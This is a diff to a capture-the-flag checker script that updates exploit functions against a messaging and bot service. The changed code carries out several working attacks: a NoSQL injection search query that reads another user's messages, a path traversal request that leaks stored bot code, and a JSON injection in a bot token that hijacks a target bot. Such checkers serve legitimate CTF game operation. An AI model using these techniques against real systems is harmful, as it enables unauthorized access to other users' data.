@@ -940,32 +940,31 @@ async def exploit_store1_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     raise MumbleException("Exploit (shared code forge) for flagstore 1 failed")
 
 @checker.exploit(2)
-async def exploit_store1_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
+async def exploit_store1_c(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
     # Exploit: forge a session token to impersonate the victim user and read their messages
     # This assumes the session token is a JWT with {"username": username} and a known secret
 
     assert task.attack_info is not None
-    storetype, username = task.attack_info.split(':', 1)
+    storetype, target_username = task.attack_info.split(':', 1)
     if storetype != 'username':
         raise MumbleException("Exploit: Wrong flagstore")
 
-    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|exploit_store2_d|{task.task_id}")
+    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|exploit_store1_c|{task.task_id}")
     username = gen.genStr(gen.genInt(8,12))
     password = gen.genStr(gen.genInt(12,16))
     botname = gen.genStr(gen.genInt(8,12))
     bottoken = gen.genStr(gen.genInt(32,64))
 
-    await do_register(logger, client, username, password)
+    await do_register_if_not_exists(logger, client, username, password)
     token = await do_login(logger, client, username, password)
-
 
     search_query_exploit = {
         "text": {
             "$regex": ".*",
         },
         "$or": [
-            {"sender": username},
-            {"receiver": username}
+            {"sender": target_username},
+            {"receiver": target_username}
         ]
     }
     msgs = await do_search(logger, client, search_query_exploit, token)
@@ -974,6 +973,8 @@ async def exploit_store1_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     except Exception as e:
         logger.error(f"Invalid search response during havoc_store1: " + f"\n{msgs}")
         raise MumbleException("Invalid search response")
+
+    logger.debug(f"All: " + f"\n{msgs}")
 
     flag = searcher.search_flag(msgs)
     if flag is not None:
@@ -1004,12 +1005,13 @@ async def exploit_store2_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     if storetype != 'botname':
         raise MumbleException("Exploit: Wrong flagstore")
 
+    logger.debug(f"/static../bots/{botname}.code")
+
     r = await client.get(f"/static../bots/{botname}.code")
     assert_status_code(logger, r, code=200)
-    botcode = r.text
+    code = r.text
 
-    path = f"/static/bots/../{botname}.json"
-    code = await do_download(logger, client, path)
+    #logger.debug(f"CODE: {code}")
 
     text = None
     try:
@@ -1018,6 +1020,8 @@ async def exploit_store2_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     except Exception as e:
         logger.error(f"The bot code returned is not valid:\n{e}")
         raise MumbleException("Faulty bot code returned")
+    
+    #logger.debug(f"TEXT: {text}")
     
     flag = searcher.search_flag(text)
     if flag is not None:
@@ -1102,34 +1106,55 @@ async def exploit_store2_d(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     botname = gen.genStr(gen.genInt(8,12))
     bottoken = gen.genStr(gen.genInt(32,64))
 
-    await do_register(logger, client, username, password)
+    await do_register_if_not_exists(logger, client, username, password)
     token = await do_login(logger, client, username, password)
 
-    await do_register_bot(logger, client, botname, bottoken + '","name":"' + target_botname, token)
+    registed = await do_register_bot_if_not_exists(logger, client, botname, bottoken + '","name":"' + target_botname, token)
+    if registed:
+        socket = do_socket_connect(logger, task.address)
+        do_socket_auth(logger, socket, botname, bottoken)
+        
+        code = {
+            "init" : [
+                {
+                    "match" : ".*",
+                    "actions" : [
+                        ["debug"]
+                    ]
+                }
+            ]
+        }
+        do_socket_setcode(logger, socket, code)
 
-    socket = do_socket_connect(logger, task.address)
-    do_socket_auth(logger, socket, botname, bottoken)
-    
-    code = {
-        "init" : [
-            {
-                "match" : ".*",
-                "actions" : [
-                    ["debug"]
-                ]
-            }
-        ]
-    }
-    do_socket_setcode(logger, socket, code)
+    logger.debug(f"botname: {botname}")
 
     await do_send(logger, client, botname, 'any', token)
     msgs = await do_get_inbox(logger, client, token)
+    
+    def try_b64decode(s):
+            try:
+                return base64.b64decode(s).decode('utf-8')
+            except Exception:
+                return False
     try:
-        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
+        msgs = [try_b64decode(msg['text']) if 'text' in msg else '-' for msg in msgs]
     except Exception as e:
         raise MumbleException("Failed to recover inbox")
     
-    flag = searcher.search_flag(msgs)
+    text = ''
+    for code in msgs:
+        if not code:
+            continue
+        try:
+            code = json.loads(code)
+            text += ' '.join([v for v in code.values() if isinstance(v, str)])
+        except Exception as e:
+            logger.error(f"The bot code returned is not valid:\n{e}")
+            raise MumbleException("Faulty bot code returned")
+    
+    logger.debug(f"text: {text}")
+    
+    flag = searcher.search_flag(text)
     if flag is not None:
         return flag
 
